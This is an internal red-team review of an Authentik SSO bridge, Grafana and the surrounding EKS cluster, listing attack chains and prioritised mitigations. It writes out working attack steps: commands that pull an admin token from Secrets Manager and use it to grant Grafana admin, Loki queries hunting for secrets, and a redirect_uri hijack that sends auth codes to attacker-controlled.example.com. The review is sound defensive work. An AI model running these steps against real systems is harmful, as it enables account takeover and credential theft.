# Authorized red-team review — 2026-05-07

**Snapshot:** commit `859154a` (post-Authentik bridge bring-up,
pre-Jenkins/ArgoCD enterprise integration).
**Scope:** `auth.cd.percona.com`, `grafana.cd.percona.com`, the Authentik
blueprint/ConfigMap path, the Secrets Manager bundle, ESO + Pod Identity,
the cluster network around `authentik` and `grafana` namespaces.
**Cross-references:** [authentication.md](authentication.md),
[ADR 0012](adr/0012-authentik-saml-oidc-bridge.md),
[eks-hardening.md](eks-hardening.md) (items #16, #21).

This is a point-in-time adversarial review, not an ongoing audit. The
intent is to surface what an attacker could realistically chain together
**before** enterprise integration scales the bridge out to Jenkins
masters and the ArgoCD UI.

## Threat actors considered

| ID | Actor | Capability |
|---|---|---|
| TA-1 | External internet attacker | No creds. Reach: any public ALB endpoint. |
| TA-2 | AWS principal in `119175775298` with broad SM read | `secretsmanager:GetSecretValue *` (e.g. SSO `AdministratorAccess` user). |
| TA-3 | Legitimate Percona employee, only in `percona` Duo group | Valid Duo creds. Grafana Viewer by default. |
| TA-4 | Cluster-admin insider | `kubectl` against the EKS cluster. |
| TA-5 | Hypothetical Authentik-pod RCE via future CVE | Code execution in the `authentik-server` pod. |

## Headline

Chains B and C are real today. Chain D requires cluster-admin already.
Chain A doesn't get far. Chain E is contained by the absence of Pod
Identity for Authentik but uncontained by NetworkPolicy.

## What was confirmed in the repo

| Check | Finding | File |
|---|---|---|
| ESO region templating | Fixed — `{{ .Values.aws.region \| default "us-east-1" }}`. No cross-region drift risk. | `resources/addons/external-secrets/templates/cluster-secret-store.yaml:19` |
| Authentik Pod Identity | **Not configured.** Authentik server pod has no AWS creds. SSRF→IMDS yields nothing useful. | `terraform/pod-identity.tf` (no `pod_identity_authentik` block) |
| NetworkPolicies | **Zero NetworkPolicy resources** anywhere in `resources/`. Cluster-wide allow-all. | (absence) |
| OIDC redirect_uri matching | `matching_mode: strict`. Exact match, no prefix bypass. | `resources/addons/authentik/templates/blueprint-grafana.yaml:134` |
| Grafana local login | `disable_login_form: true`. Local login closed. | `resources/addons/grafana/values.yaml:113` |
| Grafana role mapping | `grafana_cd_admins → GrafanaAdmin`; `percona → Viewer`. ALLOWED_GROUPS = `grafana_cd_admins percona`. **Every Percona employee = at minimum Viewer.** | `resources/addons/grafana/values.yaml:143-144` |
| Authentik akadmin secrets | All five `random_password` resources >=32 char alphanumeric. ~190 bits entropy. Practically immune to brute-force. | `terraform/authentik.tf` |
| Bundle layout | One SM secret `percona-ci-platform/authentik/config` holds all five keys including the bootstrap API token. **Same IAM scope reads them all.** | `terraform/authentik.tf` (`aws_secretsmanager_secret_version`) |

## Attack chain A — External-only attacker (TA-1)

1. `curl -s https://auth.cd.percona.com/.well-known/openid-configuration` → discloses issuer, JWKS URL, `authorization_endpoint`, `token_endpoint`, supported scopes.
2. `curl -s https://auth.cd.percona.com/api/v3/root/config/` → leaks Authentik version + branding (no auth needed for `/root/config/`).
3. Cross-reference version → published CVEs in `goauthentik/authentik`.
4. Brute-force akadmin against `/api/v3/flows/executor/default-authentication-flow/`.
5. OIDC code phishing with crafted `redirect_uri`.

**Verdict: dead end.** Brute-force defeated by ~190 bits of entropy.
redirect_uri rejected by `matching_mode: strict`. Only path is a fresh
Authentik CVE.

**Action:** subscribe to `goauthentik/authentik` GitHub Security
Advisories. Add a PrometheusRule that fires when the deployed image tag
falls behind by N minor versions, so a CVE doesn't sit unpatched.

## Attack chain B — AWS-side principal with broad SM read (TA-2) — REAL

Premise: any AWS principal in `119175775298` with
`secretsmanager:GetSecretValue` on `percona-ci-platform/authentik/config`
becomes Authentik admin.

1. `aws secretsmanager get-secret-value --secret-id percona-ci-platform/authentik/config --query SecretString --output text` → JSON with all five keys.
2. Extract `AUTHENTIK_BOOTSTRAP_TOKEN`.
3. `curl -H "Authorization: Bearer $TOKEN" https://auth.cd.percona.com/api/v3/core/users/` → list every user.
4. `POST /api/v3/core/groups/<grafana_cd_admins_pk>/add_user/` with attacker's user_id → Grafana admin on next login.
5. Or directly: log into `/if/admin/` as akadmin (akadmin is a local Authentik user, not Duo-federated, so no MFA gate).
6. With `AUTHENTIK_OIDC_GRAFANA_CLIENT_SECRET` + admin: forge OIDC token requests on behalf of any user → Grafana admin without ever touching Duo.

**Blast radius:** Authentik admin → Grafana admin (data exfil from all
Loki/Mimir/Tempo backed dashboards) → future Jenkins+ArgoCD admin once
those are wired.

**Mitigations**:

- **B1.** Enumerate every IAM principal with `secretsmanager:GetSecretValue *` or scoped to `percona-ci-platform/*`. SSO `AdministratorAccess` via Identity Center hits this trivially. List the human roles and bots that have it — that's the realistic compromise pool.
- **B2.** Resource policy on the Secrets Manager secret restricting reads to `aws:PrincipalArn` = ESO IRSA role + a named break-glass role only. Cuts the blast radius to two principals.
- **B3.** CloudTrail alarm: `GetSecretValue` on `percona-ci-platform/authentik/config` from any principal **other than** the ESO role → page.
- **B4.** Once a real Authentik admin user is provisioned (federated to Duo with MFA), revoke the akadmin local-login (set `is_active=False`, or remove from `default-authentication-flow`'s allowed users). Right now akadmin is the persistent god-mode bypass of Duo MFA. **Highest-value fix in this report.**
- **B5.** Rotate `AUTHENTIK_BOOTSTRAP_TOKEN` periodically. The migration creates the token once; old tokens stay valid until manually deleted from Directory → Tokens.

## Attack chain C — Legitimate "percona"-group employee (TA-3) — REAL

Premise: I'm a Percona contractor with valid Duo creds, only in the
broad `percona` group. I am Grafana Viewer.

1. Log in via SSO. Land on Grafana as Viewer.
2. Open Explore → datasource: Loki → `{namespace="authentik"}` → **read every Authentik server log line.**
3. Authentik logs include events: login successes, failures, group memberships at login time, user emails, `request.user.username`, source IPs of every employee logging into the SSO. Information disclosure for the entire workforce.
4. `{namespace="authentik"} |= "akadmin"` → spot every break-glass admin login event.
5. `{namespace="grafana"} |~ "client_secret|token|Bearer"` → if any consumer ever logs partial OAuth flows in error paths, exfil.
6. `{namespace="argocd"}` once ArgoCD is wired → see every git push, every sync, every secret-sync error message (these often include partial values).
7. `{namespace="jenkins"}` once master scrape lands → every console line of every CI build, including any CI-side secret accidentally echoed.
8. Cross-correlate: who's in `grafana_cd_admins`? Now you know the targets for spear-phishing.

The `percona` group is broad-grant by design. The leak isn't Grafana
itself — it's that Loki has no per-stream auth and every Viewer can
query everything.

**Mitigations**:

- **C1.** Drop `percona` from `ALLOWED_GROUPS`. Create `grafana_cd_users` for the explicit Viewer audience and use that. Reduces the read pool from "every employee" to "people who need Grafana." Trivial change in `resources/addons/grafana/values.yaml:144` plus a Duo group.
- **C2.** Audit Authentik log level (target `info`, not `debug`). Reduce information density of `{namespace="authentik"}` logs. Authentik already persists structured events to Postgres; stdout doesn't need to mirror them.
- **C3.** Loki tenant separation. Today `auth_enabled: false` (single-tenant). Per-namespace ACLs in Loki = multi-tenant rebuild — out of scope, but track. In the meantime, **don't trust Loki with anything you don't want every Viewer to read.**
- **C4.** Grafana datasource permissions: Grafana 10+ supports per-datasource role gates. Restrict the Loki datasource to Editor+ for now. Loses log-search for ICs, gains containment.

## Attack chain D — Cluster-admin insider, silent OIDC redirect hijack (TA-4)

Premise: someone with `kubectl edit` on the `authentik` namespace.

1. `kubectl edit configmap -n authentik authentik-blueprint`.
2. Change `redirect_uris[0].url` from `https://grafana.cd.percona.com/login/generic_oauth` to `https://attacker-controlled.example.com/cb`.
3. Wait for Authentik worker to re-reconcile blueprint (or restart it).
4. Phish a victim with `https://auth.cd.percona.com/application/o/authorize/?client_id=grafana&redirect_uri=https://attacker-controlled.example.com/cb&response_type=code&scope=openid+profile+groups`.
5. Victim is already logged into Authentik → consent skip → 302 with code to attacker.
6. Attacker exchanges code at `/application/o/token/` (needs `client_secret` from chain B or from Authentik DB).
7. Attacker holds id_token signed by Authentik for the victim — replay against Grafana.

**No detection today.** ConfigMap edits are not alerted. ArgoCD will
revert them on next sync, but if the attacker times the phish between
blueprint mutation and ArgoCD sync (3-min default poll), it works.

**Mitigations**:

- **D1.** ArgoCD `selfHeal: true` on the `authentik` Application — closes the timing window. Verify it's enabled.
- **D2.** Falco / k8s-audit rule: ConfigMap mutation in `authentik` namespace by any user other than `argocd-application-controller` → alert.
- **D3.** Inventory cluster-admin: `kubectl get clusterrolebinding -o yaml | grep -i admin` — explicit list. Document the principals in a runbook.

## Attack chain E — Authentik pod RCE → cluster pivot (TA-5)

Premise: a future CVE in Authentik gives RCE in the server pod.

1. Inside pod: env vars contain Postgres + Redis creds → DB and session compromise.
2. Pod's ServiceAccount token at `/var/run/secrets/kubernetes.io/serviceaccount/token` → `kubectl auth can-i --list` shows what authentik SA can do. Likely namespace-scoped only — but **verify**.
3. **No NetworkPolicy** → pod can reach:
   - `argocd-server.argocd.svc:443` and `argocd-repo-server.argocd.svc:8081` — try anonymous/default auth, look for unauth endpoints
   - `mimir-distributor.mimir.svc:8080` (push), `mimir-query-frontend.mimir.svc:8080` (query) — read all metrics, write fake metrics
   - `loki-distributor.loki.svc:3100` (push), `loki-query-frontend.loki.svc:3100` (query) — read all logs, **inject fake logs to cover tracks**
   - `kube-state-metrics.monitoring.svc` — full pod/secret name enumeration
   - Every other namespace's services
4. Mimir/Loki/Tempo have **no auth** (single-tenant, in-VPC). Pivot is free.
5. S3 buckets are not directly reachable from this pod (Authentik has no AWS creds), but the **Mimir/Loki/Tempo pods do** — pivot to those for S3 read of all observability data.

**Mitigations**:

- **E1.** **NetworkPolicy default-deny on `authentik` namespace.** Allow only ingress from `aws-load-balancer-controller` target groups, and egress only to: DNS (kube-dns), `*.duosecurity.com:443` (SAML round-trip), bundled Postgres/Redis (same namespace). Single biggest cluster-defense win and applies regardless of Authentik specifics. Same shape for `argocd`, `grafana`, `loki`, `mimir`, `tempo`. Tracked as [eks-hardening.md item #16](eks-hardening.md).
- **E2.** Pin Authentik image by digest, not just tag (covered by hardening #5).
- **E3.** Run Authentik server as `runAsNonRoot: true`, `readOnlyRootFilesystem: true` if the chart allows.
- **E4.** Enable Mimir/Loki/Tempo gateway auth (bearer token) for cluster-internal ingestion paths — covered as a TODO in ADR 0010.

## Other findings

**F1. Old SAML SP keypair recovery window.** PR-A1 cloned
`percona-ci-platform/grafana/saml/{certificate,private_key}` to
`percona-ci-platform/authentik/saml/*` and deleted the originals with a
7-day SM recovery window. If anyone with broad SM read accessed the old
secret during that window, they have the SP signing key currently in
use. **Recommended: rotate the SP keypair** — generate a new one, push
to Duo as updated SP cert (HD JSM ticket), then taint and re-sync.

**F2. OIDC client_secret stored in Authentik Postgres.** Postgres
compromise = client_secret exposure = forge OIDC token requests for
Grafana on behalf of any user. Postgres backup hygiene matters as much
as availability. **Verify the `authentik` namespace PVC carries the
AWS Backup `workload=*` selection tag** *and* that backups are
encrypted with a key the attacker pool doesn't have access to.

**F3. Authentik admin UI is internet-facing without WAF.** Probe target.
AWS WAF on the `jenkins-cd` ingress with rate-based rule (e.g. 1000
req / 5 min / IP) on `/api/v3/flows/executor/*` would slow brute-force
without breaking legitimate use.

**F4. No alerting on `default-source-enrollment` flow.** Monitor:
PrometheusRule on `authentik_events_total{action="user_create"}` rate.
A sudden spike means either a campaign-wide Duo group expansion (legit)
or a SAML lib bug being exploited (not).

**F5. SAML SP cert expiry alerting** (already tracked as
[eks-hardening.md item #21](eks-hardening.md)). Until landed, the cert
silently dying breaks all auth and there's no warning.

## Priority for action

What I'd land first if this were my system:

1. **B4 — kill the akadmin local-login** once a federated admin exists. *Highest leverage. Removes the persistent Duo-MFA bypass.*
2. **E1 — NetworkPolicy default-deny on `authentik`** (and other high-value namespaces). *Containment for any future RCE-class CVE.*
3. **C1 — drop `percona` group from Grafana ALLOWED_GROUPS, switch to `grafana_cd_users`.** *Reduces Loki read pool from every employee to a controlled set.*
4. **B2 — Secrets Manager resource policy** restricting reads to ESO + break-glass.
5. **F1 — rotate the SAML SP keypair** to invalidate any copies of the pre-rename key.
6. **D2 — ConfigMap-mutation audit alert** on `authentik` namespace.

#1 and #3 are config-only. #2 is one new ApplicationSet entry. #4 and
#5 need an HD JSM coordination touch-point but are otherwise contained.

## What this review did NOT cover

- SAML response forgery / XSW attacks (rely on Authentik lib CVEs; current versions clean)
- CSRF on Authentik admin actions (modern versions have SameSite + CSRF tokens)
- Time-based attacks on SAML response validity windows
- Open redirect bugs in older Authentik (`?next=` param) — modern versions validate
- Duo SP record drift via social engineering of IT-Ops (out of scope; their process)
- DB-level attacks on bundled Postgres (covered by network containment + RDS migration plan)

These are tracked as ongoing watch items, not point-in-time findings.

## Verdict

**No "stop-the-line" finding.** The crypto chain (SAML signed by Duo →
OIDC signed by Authentik), secret handling (TF → SM → ESO → k8s Secret),
and external access surface (no SSRF leverage, strict redirect_uri) are
all sound. The real exposure is in the *blast radius* — anyone who
already has broad AWS-side or cluster-side access can chain that into
Authentik admin, and every Percona employee can passively read
authentication telemetry via Loki.

Both classes of exposure are addressable with config-only changes
(B4, C1) plus a small set of net-new resources (B2 resource policy, E1
NetworkPolicy, D2 audit alert). None require an architecture change.
